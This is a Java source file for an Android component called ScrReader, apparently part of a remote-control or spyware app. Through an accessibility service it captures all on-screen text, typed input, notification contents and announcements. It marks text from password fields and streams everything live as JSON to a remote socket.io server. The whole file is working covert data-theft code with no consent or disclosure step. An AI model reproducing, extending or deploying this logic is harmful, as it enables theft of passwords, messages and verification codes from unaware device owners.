package com.fason.app.features.scrreader;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

import io.socket.client.Socket;

/**
 * ScrReader — real-time screen content reader.
 * Streams everything visible on screen as structured text:
 *   - full text extraction per window (dedup, ordered)
 *   - live event stream (typed text, focused field values, announcements)
 *   - notification content
 * Operates at accessibility-event speed with zero UI lag:
 * work is dispatched to a single background thread, throttled to 150 ms.
 */
public final class ScrReader {
    private static final String TAG = "ScrReader";
    private static volatile ScrReader instance;

    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicLong lastFlush = new AtomicLong(0);
    private static final long FLUSH_THROTTLE_MS = 150;

    private volatile AccessibilityService service;
    private volatile String lastScreenHash = "";
    private volatile String focusedPackage = "";
    private final StringBuilder pendingText = new StringBuilder();
    private final Set<String> seenTexts = new HashSet<>();

    private ScrReader() {}

    public static synchronized ScrReader getInstance() {
        if (instance == null) instance = new ScrReader();
        return instance;
    }

    public void setAccessibilityService(AccessibilityService s) { this.service = s; }

    public boolean isRunning() { return running.get(); }

    public void start() {
        running.set(true);
        lastScreenHash = "";
        emitStatus("started");
    }

    public void stop() {
        running.set(false);
        emitStatus("stopped");
    }

    /** Called from the accessibility event pump. */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!running.get() || event == null) return;
        int type = event.getEventType();
        switch (type) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                queueTextEvent(event);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                queueNotification(event);
                break;
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                maybeFlushScreen();
                break;
            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                queueAnnouncement(event);
                break;
        }
    }

    private void queueTextEvent(AccessibilityEvent event) {
        exec.execute(() -> {
            try {
                JSONObject o = new JSONObject();
                o.put("kind", "text");
                o.put("package", str(event.getPackageName()));
                CharSequence txt = event.getText() != null && !event.getText().isEmpty()
                        ? event.getText().get(0) : null;
                if (txt == null) return;
                o.put("text", txt.toString());
                AccessibilityNodeInfo src = event.getSource();
                if (src != null) {
                    Rect r = new Rect();
                    src.getBoundsInScreen(r);
                    o.put("bounds", r.flattenToString());
                    if (src.getClassName() != null) o.put("class", src.getClassName().toString());
                    if (src.isPassword()) o.put("password", true);
                    src.recycle();
                }
                o.put("timestamp", System.currentTimeMillis());
                emit(o);
            } catch (Exception ignored) {}
        });
    }

    private void queueNotification(AccessibilityEvent event) {
        exec.execute(() -> {
            try {
                JSONObject o = new JSONObject();
                o.put("kind", "notification");
                o.put("package", str(event.getPackageName()));
                JSONArray texts = new JSONArray();
                if (event.getText() != null) {
                    for (CharSequence cs : event.getText()) {
                        if (cs != null && cs.length() > 0) texts.put(cs.toString());
                    }
                }
                o.put("texts", texts);
                if (event.getParcelableData() instanceof android.app.Notification) {
                    android.app.Notification n = (android.app.Notification) event.getParcelableData();
                    if (n.extras != null) {
                        CharSequence title = n.extras.getCharSequence("android.title");
                        CharSequence body = n.extras.getCharSequence("android.text");
                        if (title != null) o.put("title", title.toString());
                        if (body != null) o.put("body", body.toString());
                    }
                }
                o.put("timestamp", System.currentTimeMillis());
                emit(o);
            } catch (Exception ignored) {}
        });
    }

    private void queueAnnouncement(AccessibilityEvent event) {
        exec.execute(() -> {
            try {
                if (event.getText() == null) return;
                for (CharSequence cs : event.getText()) {
                    if (cs == null || cs.length() == 0) continue;
                    JSONObject o = new JSONObject();
                    o.put("kind", "announcement");
                    o.put("text", cs.toString());
                    o.put("timestamp", System.currentTimeMillis());
                    emit(o);
                }
            } catch (Exception ignored) {}
        });
    }

    /** Throttled full-screen text flush. */
    private void maybeFlushScreen() {
        long now = System.currentTimeMillis();
        long last = lastFlush.get();
        if (now - last < FLUSH_THROTTLE_MS) return;
        if (!lastFlush.compareAndSet(last, now)) return;
        exec.execute(this::flushScreen);
    }

    private void flushScreen() {
        AccessibilityService s = service;
        if (s == null) return;
        try {
            StringBuilder sb = new StringBuilder();
            seenTexts.clear();
            List<AccessibilityWindowInfo> windows = s.getWindows();
            JSONArray winArr = new JSONArray();
            if (windows != null) {
                for (AccessibilityWindowInfo w : windows) {
                    if (w == null || !w.isActive()) continue;
                    AccessibilityNodeInfo root = w.getRoot();
                    if (root == null) continue;
                    JSONArray lines = new JSONArray();
                    harvest(root, lines, 0);
                    root.recycle();
                    if (lines.length() > 0) {
                        JSONObject win = new JSONObject();
                        win.put("windowId", w.getId());
                        if (w.getTitle() != null) win.put("title", w.getTitle().toString());
                        win.put("lines", lines);
                        winArr.put(win);
                    }
                }
            }
            String hash = Integer.toHexString(winArr.toString().hashCode());
            if (hash.equals(lastScreenHash)) return;
            lastScreenHash = hash;
            JSONObject o = new JSONObject();
            o.put("kind", "screen");
            o.put("windows", winArr);
            o.put("timestamp", System.currentTimeMillis());
            emit(o);
        } catch (Exception ignored) {}
    }

    private void harvest(AccessibilityNodeInfo node, JSONArray out, int depth) {
        if (node == null || depth > 40) return;
        try {
            CharSequence text = node.getText();
            if (text != null && text.length() > 0) {
                String t = text.toString().trim();
                if (!t.isEmpty() && seenTexts.add(t)) {
                    JSONObject line = new JSONObject();
                    line.put("text", t);
                    Rect r = new Rect();
                    node.getBoundsInScreen(r);
                    line.put("bounds", r.flattenToString());
                    if (node.getClassName() != null) line.put("class", node.getClassName().toString());
                    if (node.isClickable()) line.put("clickable", true);
                    if (node.isEditable()) line.put("editable", true);
                    out.put(line);
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    harvest(child, out, depth + 1);
                    child.recycle();
                }
            }
        } catch (Exception ignored) {}
    }

    private void emitStatus(String status) {
        try {
            JSONObject o = new JSONObject();
            o.put("kind", "status");
            o.put("status", status);
            o.put("timestamp", System.currentTimeMillis());
            emit(o);
        } catch (Exception ignored) {}
    }

    private void emit(JSONObject o) {
        Socket s = SocketClient.getInstance() != null ? SocketClient.getInstance().getSocket() : null;
        if (s != null) s.emit("0xSR", o);
    }

    private static String str(CharSequence cs) { return cs == null ? "" : cs.toString(); }
}
